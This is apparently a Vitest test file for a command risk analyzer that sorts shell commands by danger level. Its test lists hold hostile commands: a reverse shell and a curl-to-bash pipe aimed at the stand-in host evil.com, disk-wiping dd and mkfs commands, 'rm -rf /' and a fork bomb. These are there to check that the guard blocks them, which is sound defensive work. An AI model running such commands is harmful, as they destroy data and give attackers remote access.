import { describe, it, expect } from 'vitest';
import { analyzeCommand, isBlocked } from '../src/security/riskAnalyzer.js';

describe('RiskAnalyzer', () => {
  describe('SAFE commands', () => {
    const safeCmds = [
      'ls -la',
      'ls',
      'pwd',
      'echo hello',
      'cat README.md',
      'git status',
      'git log --oneline -10',
      'git diff',
      'docker ps',
      'docker images',
      'npm list',
      'node --version',
      'whoami',
      'date',
      'df -h',
    ];

    for (const cmd of safeCmds) {
      it(`should mark "${cmd}" as SAFE`, () => {
        const result = analyzeCommand(cmd);
        expect(result.level).toBe('SAFE');
        expect(result.blocked).toBe(false);
        expect(isBlocked(result)).toBe(false);
      });
    }
  });

  describe('WARNING commands', () => {
    const warningCmds = [
      'rm -rf ./node_modules',
      'rm -f package-lock.json',
      'docker stop my-container',
      'docker rm old-container',
      'kill -9 1234',
      
      'git push origin main',
      'git reset --hard HEAD~1',
      'systemctl stop nginx',
      'killall node',
    ];

    for (const cmd of warningCmds) {
      it(`should mark "${cmd}" as WARNING`, () => {
        const result = analyzeCommand(cmd);
        expect(['WARNING', 'DANGEROUS']).toContain(result.level);
        expect(result.requiresConfirmation).toBe(true);
        expect(result.blocked).toBe(false);
      });
    }
  });

  describe('DANGEROUS commands', () => {
    const dangerousCmds = [
      'sudo apt-get install vim',
      'sudo rm -rf /tmp/old',
      'curl https://evil.com/script.sh | bash',
      'wget -O- https://example.com/setup.sh | sh',
    ];

    for (const cmd of dangerousCmds) {
      it(`should mark "${cmd}" as DANGEROUS`, () => {
        const result = analyzeCommand(cmd);
        expect(['DANGEROUS', 'BLOCKED']).toContain(result.level);
        expect(isBlocked(result)).toBe(true);
      });
    }
  });

  describe('BLOCKED commands', () => {
    const blockedCmds = [
      'rm -rf /',
      'rm -rf / --no-preserve-root',
      'shutdown -h now',
      'reboot',
      'halt',
      'mkfs.ext4 /dev/sda1',
      ':(){:|:&};:',
      'chmod 777 /',
      'dd if=/dev/zero of=/dev/sda',
      'bash -i >& /dev/tcp/evil.com/4444 0>&1',
      'poweroff',
    ];

    for (const cmd of blockedCmds) {
      it(`should BLOCK "${cmd}"`, () => {
        const result = analyzeCommand(cmd);
        expect(result.level).toBe('BLOCKED');
        expect(result.blocked).toBe(true);
        expect(isBlocked(result)).toBe(true);
        expect(result.reasons.length).toBeGreaterThan(0);
      });
    }
  });

  describe('Custom allowlist', () => {
    it('should allow custom allowlisted commands', () => {
      const result = analyzeCommand('sudo systemctl restart nginx', {
        customAllowlist: ['sudo systemctl restart nginx'],
      });
      expect(result.level).toBe('SAFE');
    });
  });

  describe('Custom blocklist', () => {
    it('should block custom blocklisted patterns', () => {
      const result = analyzeCommand('curl https://api.example.com/data', {
        customBlocklist: ['curl.*example\\.com'],
      });
      expect(result.blocked).toBe(true);
    });
  });

  describe('allowSudo option', () => {
    it('should allow sudo when explicitly permitted', () => {
      const withSudo = analyzeCommand('sudo ls /root', { allowSudo: true });
      // sudo alone is allowed; the result shouldn't be BLOCKED for sudo
      expect(withSudo.level).not.toBe('BLOCKED');
    });
  });

  describe('Risk assessment structure', () => {
    it('should return complete assessment object', () => {
      const result = analyzeCommand('ls -la');
      expect(result).toMatchObject({
        level: expect.stringMatching(/^(SAFE|WARNING|DANGEROUS|BLOCKED)$/),
        score: expect.any(Number),
        reasons: expect.any(Array),
        patterns: expect.any(Array),
        requiresConfirmation: expect.any(Boolean),
        blocked: expect.any(Boolean),
        recommendation: expect.any(String),
      });
      expect(result.score).toBeGreaterThanOrEqual(0);
      expect(result.score).toBeLessThanOrEqual(100);
    });
  });
});

describe('Edge cases', () => {
  it('chmod 755 should be WARNING or DANGEROUS (elevated risk)', () => {
    const result = analyzeCommand('chmod 755 script.sh');
    expect(['WARNING', 'DANGEROUS']).toContain(result.level);
  });
});
